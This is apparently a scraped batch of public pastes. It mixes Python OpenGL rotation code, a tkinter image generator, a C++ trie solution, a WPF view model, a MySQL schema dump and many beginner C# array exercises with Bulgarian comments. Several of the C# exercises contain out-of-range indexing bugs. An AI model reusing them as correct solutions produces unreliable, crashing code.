    ## 26.6 microseconds
    # np.cross(e, r)

    ## 2.35 microseconds
    # x = e[1]*r[2] - e[2]*r[1]
    # y = e[2]*r[0] - e[0]*r[2]
    # z = e[0]*r[1] - e[1]*r[0]
    # cross_er = array([x, y, z])

    ## 1.42 microseconds
    e0, e1, e2 = e[0], e[1], e[2]
    r0, r1, r2 = r[0], r[1], r[2]
    cross_er[0] = e1*r2 - e2*r1
    cross_er[1] = e2*r0 - e0*r2
    cross_er[2] = e0*r1 - e1*r0

    ## 1.16 microseconds
    # dot_er = np.dot(e, r)

    ## 829 nanoseconds
    # dot_er = e[0]*r[0] + e[1]*r[1] + e[2]*r[2]

    ## 348 nanoseconds
    dot_er = e0*r0 + e1*r1 + e2*r2

    cos𝚹 = cos(𝚹)

    return r*cos𝚹 + e*dot_er*(1.0-cos𝚹) + cross_er*sin(𝚹)

    # Altmann (1986) p.163, Vince (2011) p.123 (same as above)
    # return r*cos𝚹  + sin(𝚹)*cross_er + (1.0-cos𝚹)*dot_er*e  # (4)


def composite_rotation(e1, Alpha, e2, Beta, cross_e1e2):

    """"""
COMPOSE A SINGLE AXIS-ANGLE ROTATION FROM TWO AXIS-ANGLE ROTATIONS

Olinde Rodrigues, 1840

Rotations, Quaternions, and Double Groups
by Simon L. Altmann (1986 book), p.159

Hamilton, Rodrigues, and the Quaternion Scandal
by Simon L. Altmann (1989 paper), p.302

Analytical Mechanics of Space Systems (Fourth Edition, 2018)
by Schaub & Junkins p.106 (3.85, 3.86)

Quaternions for Computer Graphics (2011) by John Vince, pp.90-91 (7.1, 7.2)

    """"""

    sinAlpha = sin(Alpha / 2.0)
    sinBeta =  sin(Beta / 2.0)
    cosAlpha = cos(Alpha / 2.0)
    cosBeta =  cos(Beta / 2.0)

    e10, e11, e12 = e1[0], e1[1], e1[2]
    e20, e21, e22 = e2[0], e2[1], e2[2]

    cross_e1e2[0] = e11*e22 - e12*e21
    cross_e1e2[1] = e12*e20 - e10*e22
    cross_e1e2[2] = e10*e21 - e11*e20

    dot_e1e2 = e10*e20 + e11*e21 + e12*e22

    sinAlpha_sinBeta = sinAlpha*sinBeta

    Gamma = 2.0 * acos(cosAlpha*cosBeta - sinAlpha_sinBeta * dot_e1e2)

    if Gamma == 0.0:
        return 0.0, cross_e1e2 #array([1.0, 0.0, 0.0])

    E = (sinAlpha*cosBeta * e1 +
         cosAlpha*sinBeta * e2 +
         sinAlpha_sinBeta * cross_e1e2) / sin(Gamma/2.0)

    return Gamma, E


def rotation_matrix_3x3(Phi, E, I, Ex):

    '''
    CONSTRUCT 3x3 ROTATION MATRIX WITH RODRIGUES EQUATION IN MATRIX FORM
    (Wikipedia with a sign change)

    Phi = angle to rotate in radians
    E = unit axis vector
    I = np.identity(3)
    Ex = np.zeros((3,3))

    # MAKE 4x4 MATRIX
    C = rotation_matrix_3x3(Gamma, E, I3, Z3)
    C = hstack( (C, array([[0.],[0.],[0.]])) )
    C = vstack( (C, array([[0.],[0.],[0.],[1.]]).T) )

    '''

    Ex[0,1] = -E[2]
    Ex[0,2] =  E[1]

    Ex[1,0] =  E[2]
    Ex[1,2] = -E[0]

    Ex[2,0] = -E[1]
    Ex[2,1] =  E[0]

    return I - sin(Phi)*Ex + (1.0-cos(Phi))*(Ex@Ex)


def rotation_matrix_4x4(Phi, E, I, Ex):

    '''
    CONSTRUCT 4x4 ROTATION MATRIX WITH RODRIGUES IN MATRIX NOTATION
    (Wikipedia with a sign change)

    Phi = angle to rotate in radians
    E = unit axis vector
    I = np.identity(4)
    Ex = np.zeros((4,4))

    '''

    Ex[0,1] = -E[2]
    Ex[0,2] =  E[1]

    Ex[1,0] =  E[2]
    Ex[1,2] = -E[0]

    Ex[2,0] = -E[1]
    Ex[2,1] =  E[0]

    if 1:

        return I - sin(Phi)*Ex + (1.0-cos(Phi))*(Ex@Ex)

    else:

        # Eulers' representation (?)
        E = concatenate((E, [0.0]))
        EE_T = E*E.T # = np.outer(E,E)
        return cos(Phi) * (I - EE_T) - sin(Phi)*Ex + EE_T


def make_ground():

    g.hatch_ground = glGenLists(1)
    glNewList(g.hatch_ground, GL_COMPILE)

    gr = 0.0
    s = 200.0
    xmin = -15000
    xmax =  15000
    zmin = -15000
    zmax =  15000

    glLineWidth(2.0)

    glBegin(GL_LINES)
    for x in arange(xmin, xmax, s):
        for z in arange(zmin, zmax, s):
            glVertex3f(x,   gr, z)
            glVertex3f(x+s, gr, z)
            glVertex3f(x,   gr, z)
            glVertex3f(x,   gr, z+s)
    glEnd()

    glEndList()


def make_hoops1():

    g.square_hoops1 = glGenLists(1)
    glNewList(g.square_hoops1, GL_COMPILE)

    x = 0.0
    y = 300.0
    size = 50.0
    angle = 0.0
    glLineWidth(3.0)

    for z in arange(-15000., 5250., 600.):
        y += 100*sin(-z/500.0)
        x += 170*sin(-z/500.0)
        glBegin(GL_QUADS)
        glVertex3f(x-size, y-size, z)
        glVertex3f(x+size, y-size, z)
        glVertex3f(x+size, y+size, z)
        glVertex3f(x-size, y+size, z)
        glEnd()

    glEndList()


def make_hoops2():

    g.square_hoops2 = glGenLists(1)
    glNewList(g.square_hoops2, GL_COMPILE)

    z = 0.0
    y = 300.0
    size = 50.0
    angle = 0.0
    glLineWidth(3.0)

    for x in arange(-15090., 5250., 600.):
        y += 100*sin(-x/500.0)
        z += 170*sin(-x/500.0)
        glBegin(GL_QUADS)
        glVertex3f(x, y-size, z-size)
        glVertex3f(x, y-size, z+size)
        glVertex3f(x, y+size, z+size)
        glVertex3f(x, y+size, z-size)
        glEnd()

    glEndList()


def gl_init(screenwidth, screenheight, FULL_SCREEN):

    g.screen = pygame.display.set_mode((screenwidth, screenheight),
                    DOUBLEBUF|OPENGL|FULL_SCREEN*FULLSCREEN)

    # THIS IS A PROBLEM ON LENOVO
    glBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA)

    glEnable(GL_BLEND)
    # ~ glDisable(GL_BLEND)

    glEnable(GL_LINE_SMOOTH)
    glEnable(GL_POLYGON_SMOOTH)

    glEnable(GL_DEPTH_TEST)
    glDepthFunc(GL_LESS)
    glPolygonMode(GL_FRONT_AND_BACK, GL_LINE)

    glEnable(GL_FOG)
    fogColor = (0.0, 0.0, 0.0, 1.0)
    glFogi(GL_FOG_MODE, GL_LINEAR)
    glFogfv(GL_FOG_COLOR, fogColor)
    glFogf(GL_FOG_DENSITY, 0.3)
    glHint(GL_FOG_HINT, GL_NICEST)
    glFogf(GL_FOG_START, 1000.0)
    glFogf(GL_FOG_END, 5000.0)

    glClearColor(0.0, 0.0, 0.0, 1.0)
    glClear(GL_COLOR_BUFFER_BIT|GL_DEPTH_BUFFER_BIT)

    glMatrixMode(GL_PROJECTION)
    glLoadIdentity()
    gluPerspective(60.0, screenwidth/screenheight, 1.0, 10000.0)

    glMatrixMode(GL_MODELVIEW)
    glLoadIdentity()

class g: ...

if __name__ == '__main__':
    sys.exit(main())



"
tFuX20nS,# 512x512_rgb_gradient_ctrl_2.py,here2share,Python,Tuesday 19th of December 2023 05:55:54 PM CDT,"# 512x512_rgb_gradient_ctrl_2.py

import tkinter as tk
import random
from PIL import Image, ImageTk, ImageFilter

ww = 512
hh = 512

root = tk.Tk()
root.title(""512x512_image_generator"")
root.geometry(""%dx%d+%d+%d"" %(ww, hh, 10, 10))

canvas = tk.Canvas(root, width=ww, height=hh)
canvas.pack()

def generate(event=None):
	for size in layers:
		interpolate(size)
	draw()

def interpolate(size):
	img = Image.new(""RGBA"", (size, size))
	pixels = img.load()
	for y in range(size):
		for x in range(size):
			red = random.randint(0, 255)
			green = random.randint(0, 255)
			blue = random.randint(0, 255)
			pixels[x, y] = (red, green, blue, 255)
	img = img.resize((ww, hh))
	layers[size] = img

def draw(event=None):
	buffer = Image.new(""RGBA"", (ww, hh), (255, 255, 255, 255))
	for size, layer_image in layers.items():
		if size != 4:
			alpha = float(opacity_slider[size].get()) / 2056.0
		else:
			alpha = 1
		buffer = Image.blend(buffer, layer_image, alpha)
	
	contour_layer = buffer.point(lambda x: x // 128 * 128)
	buffer = Image.blend(buffer, contour_layer, 0.05)
	
	photo = ImageTk.PhotoImage(buffer)
	canvas.create_image(0, 0, anchor=tk.NW, image=photo)
	canvas.image = photo

opacity_label = tk.Toplevel(root)
opacity_title = tk.Label(opacity_label, text=""Press Spacebar To Randomize"")
opacity_title.pack()
opacity_slider = {}
layers = {}

size = 4
interpolate(size)
while size + 6 < 32:
	size += 7
	opacity_slider[size] = tk.Scale(opacity_label, from_=512, to=0, orient=tk.VERTICAL, label=size, command=draw)
	opacity_slider[size].pack(side=tk.LEFT, fill='both', expand=True)
	opacity_slider[size].set(5)
	interpolate(size)

canvas.update()
t = opacity_label.winfo_width()
opacity_label.geometry(""%dx300+%d+%d"" %(t, 50, 50))
for t in (root, opacity_label):
	t.bind(""<space>"", generate)
opacity_label.wm_transient(root)

draw()
root.mainloop()"
YA72Xpb4,Warum.Manner.Nicht.Zuhoren.2007.Deu.720p.h264.ac3.Subs-bp,bpmircea,BrainFuck,Tuesday 19th of December 2023 05:16:40 PM CDT,"Warum Männer nicht zuhören und Frauen schlecht einparken (Why Men Don't Listen and Women Can't Read Maps) (Leander Haußmann, 2007)
aka
Warum.Manner.Nicht.Zuhoren.2007.Deu.720p.h264.ac3.Subs-bp
https://www.imdb.com/title/tt0889139/

Uploading..."
j268hpGY,Longest Word in Dictionary - Leetcode,Martin_Toseski,C++,Tuesday 19th of December 2023 05:13:20 PM CDT,"//Longest Word in Dictionary
class Solution {
public:
    struct Node {
        int cnt;
        Node* next[26];
        bool isWord;

        Node() {
            cnt = 0;
            memset(next, NULL, sizeof(next));
            isWord = false;
        }
    };

    struct Trie {
        Node* root;

        Trie() {
            root = new Node();
        }

        void insert(string word) {
            Node* curr = root;

            for (char c : word) {
                curr->cnt++;

                if (curr->next[c-'a'] == NULL) {
                    curr->next[c-'a'] = new Node();
                }

                curr = curr->next[c-'a'];
            }

            curr->cnt++;
            curr->isWord = true;
        }

        bool searchWord(string word) {
            Node* curr = root;

            for (char c : word) {
                if (curr->next[c-'a'] == NULL || !curr->next[c-'a']->isWord) {
                    return false;
                }

                curr = curr->next[c-'a'];
            }

            if (curr->isWord) {
                return true;
            }

            return false;
        }
    };

    string longestWord(vector<string>& words) {
        Trie t;

        int longest=0;
        string lexico_lowest = """";

        for (auto next : words) {
            t.insert(next);
        }

        for (auto next : words) {
            if (t.searchWord(next)) {
                if (next.size() > longest) {
                    longest = next.size();
                    lexico_lowest = next;
                }
                else if (next.size() == longest) {
                    if (lexico_lowest == """") {
                        lexico_lowest = next;
                    }
                    else if (next < lexico_lowest) {
                        lexico_lowest = next;
                    }
                }
            }
        }

        return lexico_lowest;
    }
};

/********************DRUGATA ZADACA********************/

//Replace Words
// Longest Substring Without Repeating Characters
class Solution {
public:
    struct Node {
        int cnt;
        Node* next[26];
        bool isWord;

        Node() {
            cnt=0;
            memset(next, NULL, sizeof(next));
            isWord = false;
        }
    };

    struct Trie {
        Node* root;

        Trie() {
            root = new Node();
        }

        void insert(string word) {
            Node* curr = root;

            for (char c : word) {
                curr->cnt++;

                if (curr->next[c-'a'] == NULL) {
                    curr->next[c-'a'] = new Node();
                }

                curr = curr->next[c-'a'];
            }

            curr->cnt++;
            curr->isWord = true;
        }

        void print(Node* curr, string word) {
            if (curr->isWord) {
                cout << word << "" "";
            }

            for (int i=0; i < 26; i++) {
                if (curr->next[i] != NULL) {
                    print(curr->next[i], word + char('a' + i));
                }
            }
        }

        string shortestRoot(string word) {
            string ans = """";
            Node* curr = root;

            for (char c : word) {
                if (curr->next[c-'a'] == NULL) {
                    if (curr->isWord) {
                        return ans;
                    }
                    else {
                        return """";
                    }
                }

                ans += c;

                curr = curr->next[c-'a'];

                if (curr->isWord) {
                    return ans;
                }
            }

            return ans;
        }
    };

    string replaceWords(vector<string>& dictionary, string sentence) {
        Trie t;

        vector<string> sentence_words;
        string temp = """";
        for (auto c : sentence) {
            if (isalpha(c)) {
                temp += c;
            }
            else {
                sentence_words.push_back(temp);
                temp = """";
            }
        }

        sentence_words.push_back(temp);

        for (auto next : dictionary) {
//            cout << next << "" "";
            t.insert(next);
        }

//        cout << endl;

        t.print(t.root, """");
//        cout << endl;

        for (int i=0; i < sentence_words.size(); i++) {
            string next = sentence_words[i];

            string change = t.shortestRoot(next);
//            cout << next << "" "" << change << endl;
            if (change != """") {
                sentence_words[i] = change;
            }
        }

        string ans;

        for (int i=0; i < sentence_words.size(); i++) {
            ans += sentence_words[i];
            if (i != sentence_words.size()-1) {
                ans += "" "";
            }
        }

        return ans;
    }
};
"
ZtTsuqK3,Untitled,A_E_Ivanov,C#,Tuesday 19th of December 2023 04:58:12 PM CDT,"internal class Program
{
    private static void Main(string[] args)
    {
        //съсдаваме масив на който да му бъдат подадени дани от потребителя

        int[] array = Console.ReadLine().Split(new char[] { ' ', ',' }, StringSplitOptions.RemoveEmptyEntries).Select(int.Parse).ToArray();

        int firstNumber = array[0];

        //създаваме празен лист, първо ще обходим масива (array) , число по число като започнем от вторият елемент.
        //ще го направим с два цикъла. Първият път ще търсим числа по-малки от първият елемент (firstNumber). Намеренти ще ги записваме в list.
        //после ще добавим първият елемт от оригиналният масив , а след това числата който са равни или по-големи от него.

        List<int> list = new List<int>();

        for (int i = 1; i < array.Length; i++)
        {
            int currentNumber = array[i];

            if (currentNumber < firstNumber)
            {
                list.Add(currentNumber);
            }
        }

        list.Add(firstNumber);

        for (int i = 1; i < array.Length; i++)
        {
            int currentNumber = array[i];

            if (currentNumber >= firstNumber) 
            {
                list.Add(currentNumber);
            }
        }

        /*
         Zero Tests:
         8,5,19,4,7,15,6,6
         5,4,7,6,6,8,19,15
        */

        Console.WriteLine(string.Join("" "", list));
    }
}"
M4wjQEkQ,Untitled,A_E_Ivanov,C#,Tuesday 19th of December 2023 04:57:28 PM CDT,"internal class Program
{
    private static void Main(string[] args)
    {
        /*
         Прочитаме числовата редица. Запазваме в променливата ""ж"" числото чиято повтаряемост търсим.
         Създаваме променлива брояч (count). Обхождаме масива с фор цикл и проверяваме всеки елемнт по отделно дали е равен на ""ж"".
         Ако е равен увеличаваме брояча с едно.
        */

        int[] array = Console.ReadLine().Split(new char[] { ' ', ',' }, StringSplitOptions.RemoveEmptyEntries).Select(int.Parse).ToArray();

        int x = int.Parse(Console.ReadLine());

        int count = 0;

        for (int i = 0; i < array.Length; i++)
        {
            int currentNumber = array[i];

            if (x == currentNumber)
            {
                count++;
            }
        }

        /*
          Zero tests:
        1,2,3,2,5,1,6,2,2,2
        1

        2,-15,22,23,2,15,-15,-15
        15
        */
        Console.WriteLine(count);
    }
}"
PCAssc0e,Untitled,A_E_Ivanov,C#,Tuesday 19th of December 2023 04:56:17 PM CDT,"internal class Program
{
    private static void Main(string[] args)
    {
        /*
         Прочитаме числа от конзолата. Запазваме ги в масив. Създаваме променлива от тим bool. Ползваме я като знаме.
         Обхождаме масива елемент по елемент. Забелевете не до последният елемент а до предпоследният (numbers.Lenght - 1),
         това е така защото проверката изисква да вземем текущият елемет и този след него. Ако не бяхме направили това
         на последното завъртане на цикъла, щяхме да вземем последният елемент numbers[i] и щяхме да поискаме да го сравним със несъществуращ елемент
         и програмата щеяе да ""гръмне"". Следва проверка ако следващият елемент не намалява знамето става със статут false. 
         Прекъсваме фор цикъла с командата ""break"". Следва проверка на знамето.
         */

        int[] numbers = Console.ReadLine().Split(new char[] { ' ', ',' }, StringSplitOptions.RemoveEmptyEntries).Select(int.Parse).ToArray();

        bool flag = true;

        for (int i = 0; i < numbers.Length - 1; i++)
        {
            if (numbers[i] <= numbers[i + 1])
            {
                flag = false;
                break;
            }
        }

        if (flag)
        {
            Console.WriteLine(""Is Monotonously Decreasing"");
        }
        else
        {
            Console.WriteLine(""Is Not Monotonously Decreasing"");
        }
    }
}"
dWb0HY3c,Untitled,A_E_Ivanov,C#,Tuesday 19th of December 2023 04:55:04 PM CDT,"internal class Program
{
    private static void Main(string[] args)
    {
        int[] numbers = Console.ReadLine().Split(new char[] { ' ', ',' }, StringSplitOptions.RemoveEmptyEntries).Select(int.Parse).ToArray();

        bool flag = true;

        // В тялото на цикъла сравняваме първото със последното число, после второто със предпоследното и т.н.
        
        for (int i = 0; i < numbers.Length / 2; i++)
        {
            int firstNumber = numbers[i];
            int secondNumber = numbers[numbers.Length - i];

            if (firstNumber != secondNumber)
            {
                flag = false;
                break;
            }
        }

        if (flag) 
        {
            Console.WriteLine(""Yes"");
        }
        else
        {
            Console.WriteLine(""No"");
        }
    }
}"
7KRgedn0,Untitled,A_E_Ivanov,C#,Tuesday 19th of December 2023 04:54:09 PM CDT,"internal class Program
{
    private static void Main(string[] args)
    {
        int[] numbers = Console.ReadLine().Split(new char[] { ' ', ',' }, StringSplitOptions.RemoveEmptyEntries).Select(int.Parse).ToArray();

        int sumValueOfPositiveNumbers = 0;
        int countOfNegativeNumbers = 0;

        for (int i = 0; i < numbers.Length; i++)
        {
            int currentNumber = numbers[i];

            if (currentNumber >= 0)
            {
                sumValueOfPositiveNumbers += currentNumber;
            }
            else
            {
                countOfNegativeNumbers++;
            }
        }

        Console.WriteLine($""Sum value of all positive numbers is: {sumValueOfPositiveNumbers}"");
        Console.WriteLine($""Number of negative numbers is: {countOfNegativeNumbers}"");
    }
}"
snhxsZ3R,Untitled,A_E_Ivanov,C#,Tuesday 19th of December 2023 04:53:14 PM CDT,"internal class Program
{
    private static void Main(string[] args)
    {
        int[] numbers = Console.ReadLine().Split(new char[] { ' ', ',' }, StringSplitOptions.RemoveEmptyEntries).Select(int.Parse).ToArray();

        bool flag = false;

        for (int i = 0; i < numbers.Length - 1; i++)
        {
            int number = numbers[i];
            int nextNumber = numbers[i + 1];

            if (number == 0 && nextNumber == 0)
            {
                flag = true;
                break;
            }
        }

        if (flag)
        {
            Console.WriteLine(""Yes"");
        }
        else
        {
            Console.WriteLine(""No"");
        }
    }
}"
82C62W2T,Untitled,A_E_Ivanov,C#,Tuesday 19th of December 2023 04:49:57 PM CDT,"internal class Program
{
    private static void Main(string[] args)
    {
        int[] numbers = Console.ReadLine().Split(new char[] { ' ', ',' }, StringSplitOptions.RemoveEmptyEntries).Select(int.Parse).ToArray();

        int[] output = new int[numbers.Length / 2];

        for (int i = 0; i < numbers.Length; i++)
        {
            int a = numbers[i];
            int b = numbers[numbers.Length - i];

            int c = a + b;

            output[i] = c;
        }

        Console.WriteLine(string.Join("","", output));
    }
}"
QVq9tWGq,Untitled,A_E_Ivanov,C#,Tuesday 19th of December 2023 04:48:48 PM CDT,"internal class Program
{
    private static void Main(string[] args)
    {
        int[] numbers = Console.ReadLine().Split(new char[] { ' ', ',' }, StringSplitOptions.RemoveEmptyEntries).Select(int.Parse).ToArray();

        string[] output = new string[numbers.Length / 2];

        for (int i = 0; i < numbers.Length / 2; i++)
        {
            int a = numbers[i];
            int b = numbers[numbers.Length / 2 + i];

            string c = a.ToString() + b;

            output[i] = c;
        }

        Console.WriteLine(string.Join("","", output));  
    }
}"
xCB6HDuh,Untitled,A_E_Ivanov,C#,Tuesday 19th of December 2023 04:47:27 PM CDT,"internal class Program
{
    private static void Main(string[] args)
    {
        int n = int.Parse(Console.ReadLine());

        int[] a = Console.ReadLine().Split(new char[] { ' ', ',' }, StringSplitOptions.RemoveEmptyEntries).Select(int.Parse).ToArray();

        int count = 0;

        for (int i = 0; i < a.Length; i++)
        {
            int number = a[i];

            if (number % 2 == 0)
            {
                count++;
            }

            if (count != 0 && count % 2 == 0)
            {
                a[i] += 1;
            }
        }

        Console.WriteLine(string.Join("" "", a));
    }
}"
0pETbPij,Untitled,A_E_Ivanov,C#,Tuesday 19th of December 2023 04:46:32 PM CDT,"internal class Program
{
    private static void Main(string[] args)
    {
        int n = int.Parse(Console.ReadLine());

        int[] a = Console.ReadLine().Split(new char[] { ' ', ',' }, StringSplitOptions.RemoveEmptyEntries).Select(int.Parse).ToArray();

        double sum = 0;
        int count = 0;

        for (int i = 0; i < a.Length; i++)
        {
            int number = a[i];

            if (number % 2 == 0 && i % 2 != 0)
            {
                sum += number;
                count++;
            }
        }

        double output = sum / count;

        Console.WriteLine(output);
    }
}"
wnH2s28g,Untitled,A_E_Ivanov,C#,Tuesday 19th of December 2023 04:45:43 PM CDT,"internal class Program
{
    private static void Main(string[] args)
    {
        int n = int.Parse(Console.ReadLine());

        int[] a = Console.ReadLine().Split(new char[] { ' ', ',' }, StringSplitOptions.RemoveEmptyEntries).Select(int.Parse).ToArray(); 

        int[] b = Console.ReadLine().Split(new char[] { ' ', ',' }, StringSplitOptions.RemoveEmptyEntries).Select(int.Parse).ToArray();

        int[] c = new int[n * 2];

        int count = 0;

        for (int i = 0; i < n; i++)
        {
            c[count + i] = a[i];
            c[count + i + 1] = b[i];
            count++;
        }

        Console.WriteLine(string.Join("" "", c));

        /*
        * Zero Test:

         3
         1 2 3
         4 5 6

        */
    }
}"
30Umw1BR,Untitled,A_E_Ivanov,C#,Tuesday 19th of December 2023 04:44:26 PM CDT,"internal class Program
{
    private static void Main(string[] args)
    {
        int n = int.Parse(Console.ReadLine());

        int[] a = Console.ReadLine().Split(new char[] { ' ', ',' }, StringSplitOptions.RemoveEmptyEntries).Select(int.Parse).ToArray();

        int[] b = Console.ReadLine().Split(new char[] { ' ', ',' }, StringSplitOptions.RemoveEmptyEntries).Select(int.Parse).ToArray();

        int[] c = new int[2 * n];

        int count = 0;

        for (int i = 0; i < n; i++)
        {
            c[count + i] = a[i];
            c[count + i + 1] = b[b.Length - 1 - i];
            count++;
        }

        Console.WriteLine(string.Join("" "", c));

        /*
         * Zero Test:
         
          3
          1 2 3
          4 5 6
          
         */
    }
}"
Lq230trN,mvvmnotepad,bobmarley12345,C#,Tuesday 19th of December 2023 04:44:22 PM CDT,"using System;
using System.Diagnostics;
using System.Windows.Input;
using SharpPad.Commands;
using SharpPad.WPF.Notepad.Backend;

namespace SharpPad.WPF.Notepad {
    public class DocumentViewModel : BaseViewModel {
        private string filePath;
        private int caretIndex;
        private int lineIndex;

        public string FilePath {
            get => this.filePath;
            set => this.RaisePropertyChanged(ref this.filePath, value);
        }

        public int CaretIndex {
            get => this.caretIndex;
            private set => this.RaisePropertyChanged(ref this.caretIndex, value);
        }

        public int LineIndex {
            get => this.lineIndex;
            private set => this.RaisePropertyChanged(ref this.lineIndex, value);
        }

        /// <summary>
        /// Gets or sets the document model used as a backend for this document. May be
        /// null, in which case, most document functionality won't work
        /// </summary>
        public ITextDocument DocumentModel { get; set; }

        /// <summary>
        /// Gets the editor model which is used to assist in usage of the document
        /// </summary>
        public ITextEditor Editor { get; private set; }

        public ICommand CloseCommand { get; }

        public DocumentViewModel() {
            this.CloseCommand = new RelayCommand(() => {
                // maybe reference the NotepadviewModel in the document, and remove `this` from the document list?
                // this.Editor?.CloseEditor(this.DocumentModel);
            });
        }

        public void OnDisconnectEditor() {
            if (this.Editor == null) {
                return;
            }

            this.Editor.CaretChanged -= this.OnEditorCaretChanged;
            this.Editor.TextBufferModified -= this.OnTextBufferChanged;
            this.Editor = null;
        }

        public void OnConnectEditor(ITextEditor editor) {
            if (this.Editor == editor)
                return;
            if (this.Editor != null)
                throw new InvalidOperationException(""Another editor already connected"");

            this.Editor = editor;
            editor.CaretChanged += this.OnEditorCaretChanged;
            editor.TextBufferModified += this.OnTextBufferChanged;
            if (this.DocumentModel == null) {
                this.DocumentModel = editor.NewDocument();
            }
        }

        private void OnEditorCaretChanged(ITextEditor editor) {
            this.RaisePropertyChanged(nameof(this.CaretIndex));
            this.RaisePropertyChanged(nameof(this.LineIndex));
        }

        private void OnTextBufferChanged(ITextEditor editor) {
            this.RaisePropertyChanged(nameof(this.CaretIndex));
            this.RaisePropertyChanged(nameof(this.LineIndex));
        }
    }
}"
Zi8Jn5DE,Untitled,A_E_Ivanov,C#,Tuesday 19th of December 2023 04:43:12 PM CDT,"internal class Program
{
    private static void Main(string[] args)
    {
        int[] numbers = Console.ReadLine().Split(new char[] { ' ', ',' }, StringSplitOptions.RemoveEmptyEntries).Select(int.Parse).ToArray();

        RearrangeArray(numbers);

        Console.WriteLine(string.Join("" "", numbers));
    }
    static void RearrangeArray(int[] arr)
    {
        List<int> negative = new List<int>();
        List<int> positive = new List<int>();

        for (int i = 0; i < arr.Length; i++)
        {
            int number = arr[i];

            if (number < 0)
            {
                negative.Add(number);
            }
            else
            {
                positive.Add(number);
            }
        }

        for (int i = 0; i < negative.Count; i++)
        {
            arr[i] = negative[i];
        }

        for (int i = 0; i < positive.Count; i++)
        {
            arr[negative.Count + i] = positive[i];
        }
    }
}"
UUfcEcTB,Untitled,A_E_Ivanov,C#,Tuesday 19th of December 2023 04:39:14 PM CDT,"internal class Program
{
    private static void Main(string[] args)
    {
        int[] first = Console.ReadLine().Split(new char[] { ' ', ',' }, StringSplitOptions.RemoveEmptyEntries).Select(int.Parse).ToArray();
        int[] second = Console.ReadLine().Split(new char[] { ' ', ',' }, StringSplitOptions.RemoveEmptyEntries).Select(int.Parse).ToArray();

        Array.Sort(first);

        int outputNumber = 0;

        for (int i = 0; i < first.Length; i++)
        {
            int numberFirst = first[i];

            bool flag = true;

            for (int j = 0; j < second.Length; j++)
            {
                int numberSecond = second[j];

                if (numberFirst == numberSecond)
                {
                    flag = false;
                    break;
                }
            }

            if (flag) 
            {
                outputNumber = numberFirst;
                break;
            }
        }

        Console.WriteLine(outputNumber);

        /*
         44 5 66 21 88 1 23 5
         5 21 23 88 1 89 25 26
         
         44
         */
    }
}"
PhW0fTVs,Warum.Manner.Nicht.Zuhoren.2007.Deu.1080p.h264.ac3.Subs-bp,bpmircea,BrainFuck,Tuesday 19th of December 2023 04:30:30 PM CDT,"Warum Männer nicht zuhören und Frauen schlecht einparken (Why Men Don't Listen and Women Can't Read Maps) (Leander Haußmann, 2007)
aka
Warum.Manner.Nicht.Zuhoren.2007.Deu.1080p.h264.ac3.Subs-bp
https://www.imdb.com/title/tt0889139/

Uploading..."
QaJY9WWA,SQL dump script,Foltrex2002,MySQL,Tuesday 19th of December 2023 04:24:16 PM CDT,"-- MySQL dump 10.13  Distrib 8.0.33, for macos13 (arm64)
--
-- Host: localhost    Database: social_network
-- ------------------------------------------------------
-- Server version	5.7.41

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `comments`
--

DROP TABLE IF EXISTS `comments`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `comments` (
  `id` varchar(255) NOT NULL,
  `content` text NOT NULL,
  `image_url` varchar(255) DEFAULT NULL,
  `time` datetime NOT NULL,
  `creator_id` varchar(255) NOT NULL,
  `post_id` varchar(255) NOT NULL,
  `timeline_user_id` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FKt7f0j94mbyal8bamvf1friujw` (`creator_id`),
  KEY `FKh4c7lvsc298whoyd4w9ta25cr` (`post_id`),
  KEY `FK7rikt5k37h7euppk8eril83n8` (`timeline_user_id`),
  CONSTRAINT `FK7rikt5k37h7euppk8eril83n8` FOREIGN KEY (`timeline_user_id`) REFERENCES `users` (`id`),
  CONSTRAINT `FKh4c7lvsc298whoyd4w9ta25cr` FOREIGN KEY (`post_id`) REFERENCES `posts` (`id`),
  CONSTRAINT `FKt7f0j94mbyal8bamvf1friujw` FOREIGN KEY (`creator_id`) REFERENCES `users` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `comments`
--

LOCK TABLES `comments` WRITE;
/*!40000 ALTER TABLE `comments` DISABLE KEYS */;
INSERT INTO `comments` VALUES ('5321b9d0-5ea5-4e57-b9ad-bfe1e1a5af9e','Cool','','2023-12-11 18:20:03','98ae659e-daed-4ce8-b565-0925e0cbb05b','67158822-4971-4358-a591-28d8cd117581','1477bbd0-f6fe-40ff-98c6-f844f21a3f44');
/*!40000 ALTER TABLE `comments` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `likes`
--

DROP TABLE IF EXISTS `likes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `likes` (
  `id` varchar(255) NOT NULL,
  `count` bigint(20) DEFAULT NULL,
  `post_id` varchar(255) DEFAULT NULL,
  `user_id` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `FKry8tnr4x2vwemv2bb0h5hyl0x` (`post_id`),
  KEY `FKnvx9seeqqyy71bij291pwiwrg` (`user_id`),
  CONSTRAINT `FKnvx9seeqqyy71bij291pwiwrg` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`),
  CONSTRAINT `FKry8tnr4x2vwemv2bb0h5hyl0x` FOREIGN KEY (`post_id`) REFERENCES `posts` (`id`)
